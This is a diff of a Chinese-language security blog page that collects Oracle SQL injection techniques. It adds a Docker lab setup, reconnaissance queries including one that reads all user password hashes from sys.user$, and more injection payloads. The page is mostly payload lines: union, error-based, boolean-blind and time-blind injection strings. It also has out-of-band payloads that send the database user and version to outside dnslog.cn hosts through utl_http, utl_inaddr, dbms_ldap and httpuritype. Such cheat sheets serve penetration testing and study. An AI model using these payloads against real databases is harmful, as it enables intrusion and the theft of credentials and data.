@@ -16,7 +16,7 @@
 <meta property="og:description" content="Oracle数据库注入方式总结">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-09-09T16:09:49.000Z">
-<meta property="article:modified_time" content="2020-09-09T16:21:54.853Z">
+<meta property="article:modified_time" content="2020-09-10T13:16:23.933Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
@@ -157,6 +157,25 @@
       
         <p>Oracle数据库注入方式总结</p>
 <a id="more"></a>
+<h1 id="Oracle介绍"><a href="#Oracle介绍" class="headerlink" title="Oracle介绍"></a>Oracle介绍</h1><p>Oracle一种C/S架构的数据库管理系统，Oracle Client由User Process、Server Process和PGA组成，Oracle Server由instance和database组成。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ChaMd5Team&#x2F;Pentest-tools.git</span><br><span class="line">cd Pentest-tools&#x2F;Oracleinject</span><br><span class="line">docker build -t oracletest .</span><br><span class="line">docker run --name oracleinject -itd -p 1521:1521 oracletest &#x2F;bin&#x2F;bash</span><br><span class="line">docker exec -it oracleinject &#x2F;bin&#x2F;bash</span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line">sqlplus &#x2F;nolog</span><br><span class="line">conn &#x2F; as sysdba</span><br></pre></td></tr></table></figure>
+<h1 id="知识基础"><a href="#知识基础" class="headerlink" title="知识基础"></a>知识基础</h1><ul>
+<li>不同于MySQL的是，Oracle的完整的查询语句一定要有表名，若不知道表名，可使用Oracle的虚表dual。<h2 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h2>此部分参考ChaMd5安全团队Oracle学习文章，侵删</li>
+</ul>
+<p>获得数据库版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</span><br><span class="line">SELECT version FROM v$instance;</span><br></pre></td></tr></table></figure>
+<p>获得OS版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version where banner like &#39;TNS%&#39;;</span><br></pre></td></tr></table></figure>
+<p>获得当前数据库用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user from dual;</span><br></pre></td></tr></table></figure>
+<p>获得当前用户权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM session_privs;</span><br></pre></td></tr></table></figure>
+<p>获取所有数据库用户密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name, spare4 FROM sys.user$;</span><br></pre></td></tr></table></figure>
+<p>列出DBA账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct grantee from dba_sys_privs where admin_option &#x3D;&#39;YES&#39;;</span><br></pre></td></tr></table></figure>
+<p>获取DB文件路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM V$DATAFILE;</span><br></pre></td></tr></table></figure>
 
 <h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>查询表</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select table_name from user_tables where rownum&#x3D;1</span><br><span class="line">union select table_name from user_tables where rownum&#x3D;1 and table_name &lt;&gt; Know_tablename</span><br></pre></td></tr></table></figure>
@@ -167,7 +186,9 @@
 
 <h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><ul>
 <li>utl_inaddr.get_host_name<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;utl_inaddr.get_host_name((select user from dual))</span><br></pre></td></tr></table></figure></li>
-<li>ctxsys.drithsx.sn<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual))</span><br></pre></td></tr></table></figure></li>
+<li>utl_inaddr.get_host_address()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_address(&#39;~&#39;||(select user from dual)||&#39;~&#39;) from dual;</span><br></pre></td></tr></table></figure></li>
+<li>ctxsys.drithsx.sn()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual))</span><br></pre></td></tr></table></figure></li>
+<li>ctxsys.ctx_report.token_type()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ctxsys.ctx_report.token_type((select user from dual), &#39;1&#39;) from dual;</span><br></pre></td></tr></table></figure></li>
 <li>XMLType<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null</span><br></pre></td></tr></table></figure></li>
 <li>dbms_xdb_version.checkin<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
 <li>dbms_xdb_version.makeversioned<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
@@ -178,12 +199,18 @@
 </li>
 </ul>
 <h1 id="带外通信"><a href="#带外通信" class="headerlink" title="带外通信"></a>带外通信</h1><ul>
-<li>HTTP外带，类似SSRF<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;utl_http.request(&#39;http:&#x2F;&#x2F;www.ehae75.dnslog.cn&#39;||(select banner from sys.v_$version where rownum&#x3D;1))</span><br></pre></td></tr></table></figure></li>
-<li>DNS外带<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select utl_inaddr.get_host_address((select user from dual)||&#39;.ehae75.dnslog.cn&#39;) from dual)is not null</span><br></pre></td></tr></table></figure>
-
+<li><p>utl_http.request()，HTTP外带，类似SSRF</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;utl_http.request(&#39;http:&#x2F;&#x2F;www.ehae75.dnslog.cn&#39;||(select banner from sys.v_$version where rownum&#x3D;1))</span><br></pre></td></tr></table></figure></li>
+<li><p>utl_inaddr.get_host_address()，DNS外带</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select utl_inaddr.get_host_address((select user from dual)||&#39;.ehae75.dnslog.cn&#39;) from dual)is not null</span><br></pre></td></tr></table></figure>
 </li>
+<li><p>sys.dbms_ldap.init()，DNS外带</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_ldap.init(&#39;2gwq0x.dnslog.cn&#39;,80) from dual;</span><br></pre></td></tr></table></figure></li>
+<li><p>httpuritype()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select httpuritype((select user from dual)||&#39;.xxxxxx.dnslog.cn&#39;).getclob() from dual;</span><br></pre></td></tr></table></figure>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1></li>
 </ul>
-<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ul>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ul>
 <li>decode<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x3D;(select decode(substr(user,1,1),&#39;S&#39;,1,0) from dual)</span><br></pre></td></tr></table></figure></li>
 <li>instr<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x3D;(instr((select user from dual),&#39;PENTEST&#39;))</span><br></pre></td></tr></table></figure>
 <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2></li>
@@ -191,6 +218,7 @@
 
 </li>
 </ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单的写了写常用的注入方式，实际情况估计还要考虑到waf对抗的情况；除此之外，Oracle也涉及到提权等操作，还暂未涉及，包括通过Oracle来执行命令等，后续不断完善此文章吧。</p>
 
       
       
@@ -337,7 +365,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#联合注入"><span class="toc-number">1.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#报错注入"><span class="toc-number">2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#带外通信"><span class="toc-number">3.</span> <span class="toc-text">带外通信</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注"><span class="toc-number">4.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#布尔盲注"><span class="toc-number">4.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#时间盲注"><span class="toc-number">4.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle介绍"><span class="toc-number">1.</span> <span class="toc-text">Oracle介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#知识基础"><span class="toc-number">3.</span> <span class="toc-text">知识基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用查询语句"><span class="toc-number">3.1.</span> <span class="toc-text">常用查询语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#联合注入"><span class="toc-number">4.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#报错注入"><span class="toc-number">5.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#带外通信"><span class="toc-number">6.</span> <span class="toc-text">带外通信</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注"><span class="toc-number">7.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#布尔盲注"><span class="toc-number">7.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#时间盲注"><span class="toc-number">7.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
                     </div>
                 </span>
             </div>
